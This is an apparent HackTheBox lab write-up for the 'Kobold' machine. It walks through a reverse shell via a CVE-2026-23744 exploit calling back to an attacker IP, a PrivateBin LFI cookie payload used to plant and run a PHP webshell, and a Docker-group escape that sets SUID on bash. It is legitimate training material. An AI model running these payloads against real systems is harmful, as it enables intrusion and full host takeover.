# Kobold

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2026-23744, MCPJam RCE, PrivateBin LFI, Webshell, Docker Escape, SUID, LFI, RCE, Container Escape, Prompt Injection, AI Security, MCP, Privilege Escalation
**Date:** 2026-05-10

Unauthenticated RCE against MCPJam Inspector via CVE-2026-23744 gives a shell as `ben`. PrivateBin at `bin.kobold.htb` is vulnerable to LFI via a template cookie - used to drop a webshell and pivot to `www-data`. `ben` is in the Docker group, which allows mounting the host filesystem and setting a SUID bash for root.

## 1. Enumeration

Started with a full port scan.

```bash
nmap -sV -sC 10.129.54.83 -Pn -p-
```

Findings:
- 22/tcp - OpenSSH 9.6p1
- 80/tcp - nginx 1.24.0, redirects to HTTPS
- 443/tcp - nginx 1.24.0 - Kobold Operations Suite. TLS cert covers `kobold.htb` and `*.kobold.htb`
- 3552/tcp - Golang HTTP - Arcane v1.13.0 login panel

TLS cert disclosed wildcard subdomains. Added the known ones to /etc/hosts.

```
10.129.54.83  kobold.htb bin.kobold.htb mcp.kobold.htb
```

`mcp.kobold.htb` served an MCPJam Inspector interface. `bin.kobold.htb` served a PrivateBin instance.

## 2. MCPJam RCE (CVE-2026-23744)

CVE-2026-23744 is an unauthenticated RCE in MCPJam Inspector. The Inspector evaluates untrusted input without sanitisation, allowing arbitrary command execution on the server.

```bash
nc -lvnp 4444
```

```bash
python3 exploit_CVE-2026-23744.py \
  --target https://mcp.kobold.htb \
  --lhost <ATTACKER_IP> \
  --lport 4444
```

**Result:** Shell as `ben`. User flag at `/home/ben/user.txt`.

## 3. PrivateBin LFI: Webshell

PrivateBin at `bin.kobold.htb` uses a `template` cookie to select the rendering template. The value is used in a file include without sufficient path sanitisation - setting it to a path traversal sequence reads arbitrary files from the server.

```bash
# Verify LFI
curl -sk "https://bin.kobold.htb/" \
  -H "Cookie: template=../../../etc/passwd"
```

LFI confirmed. Wrote a PHP webshell to a writable path on the server, then used the LFI to include and execute it.

```bash
# Drop webshell and confirm execution
curl -sk "https://bin.kobold.htb/" \
  -H "Cookie: template=../data/rce1" \
  --get --data-urlencode "cmd=id"
```

**Result:** Code execution as `www-data` confirmed.

## 4. PrivEsc: Docker Group

Checked group memberships as `ben`.

```bash
id
# uid=1000(ben) gid=1000(ben) groups=1000(ben),999(docker)
```

`ben` is in the Docker group. Running a container with the host filesystem mounted as root gives full read/write access to the host as root inside the container - used to set a SUID bit on bash.

```bash
docker run -v /:/mnt --rm --privileged --user 0 alpine \
  sh -c "chmod 4755 /mnt/bin/bash"
```

```bash
bash -p
whoami
# root
```

**Result:** Root shell obtained.

## 5. Flags

- User: `redacted`
- Root: `redacted`
